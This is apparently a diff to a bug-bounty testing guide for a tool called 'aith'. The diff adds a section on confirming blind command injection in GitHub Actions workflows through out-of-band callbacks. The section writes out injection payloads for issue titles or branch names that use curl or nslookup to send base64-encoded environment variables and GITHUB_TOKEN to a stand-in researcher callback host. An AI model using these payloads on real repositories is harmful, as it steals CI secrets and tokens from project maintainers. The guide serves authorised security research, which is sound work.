@@ -220,14 +220,57 @@ aith assess kali exec \
      --body "test"
 
 # Step 2: If workflow triggers on issues and interpolates title -> secrets exfiltrated
-#   First mint a nonce-tagged callback host and embed its http host in the payload above:
-#     aith oob mint --technique CMDI --target-url https://github.com/TARGET/REPO --probe-kind exploit
-#     # -> http  http://<nonce>.researcher.example/   (curl that host in the injected step)
-#   Then correlate the exfil callback to this probe:
-#     aith oob poll --client <name>   # matched probe<->callback pair = secrets reached your host
-#   (aith oob client logs <name> --lines 80 is a raw listener tail for infra debugging only, not correlation.)
+#   The title above carries a minted callback host; correlate the hit with
+#   `aith oob poll` per the "OOB Blind Confirmation" section below.
 # CVSS: 9.3 Critical (RCE with repo secrets)
 ```
+
+## OOB Blind Confirmation
+
+CI/CD injection is almost always blind — the workflow runs server-side and you
+see only the run log (if that). Out-of-band callbacks are the reliable binary
+confirmation: a nonce-tagged host that fires from the pipeline proves the
+injected step reached the network, and a data-exfil payload surfaces the leaked
+secret as the left label of the callback host.
+
+Confirm readiness with `aith oob status --json`, then **mint a nonce-tagged
+callback** so the hit is self-correlating instead of eyeballed out of the
+listener log:
+
+```bash
+# Mint one nonce per injection point; record the correlation context.
+aith oob mint --technique cmdi --target-url https://github.com/TARGET/REPO --probe-kind exploit
+# -> nonce  <prefix>-<token>
+#    http   http://<prefix>-<token>.researcher.example/
+#    dns    <prefix>-<token>.researcher.example
+```
+
+Embed the minted host in the injected step — SSRF (`curl http://<host>/` from a
+runner that can reach internal services) or secret exfil (the secret becomes the
+left label of the callback host):
+
+```yaml
+# Issue title / PR body / branch name carrying the minted host:
+"; curl http://<prefix>-<token>.researcher.example/$(env | base64 -w0) #
+# Or DNS-only exfil when egress is HTTP-filtered:
+"; nslookup $(printenv GITHUB_TOKEN | head -c40).<prefix>-<token>.researcher.example #
+```
+
+Then **poll for the correlated hit** instead of reading the listener log by hand:
+
+```bash
+aith oob poll --client <name> --json
+```
+
+Read the `matched` array: each entry pairs the callback (`protocol`,
+`remote_address`, `observed_at`) with the recorded probe (`technique`,
+`target_url`), so a non-empty `matched` for your nonce is the binary
+confirmation that the pipeline reached your host — no log grepping. An exfil
+payload surfaces the leaked secret as the left label of the matched callback
+host. If `matched` stays empty after the run triggers, fall back to a benign
+marker in the run log and record a runtime issue noting OOB would have been
+decisive. (`aith oob client logs <name> --lines 80` is a raw listener tail for
+infra debugging only, not correlation.)
 
 ## Real-World GHSAs (Proven Payouts)
 
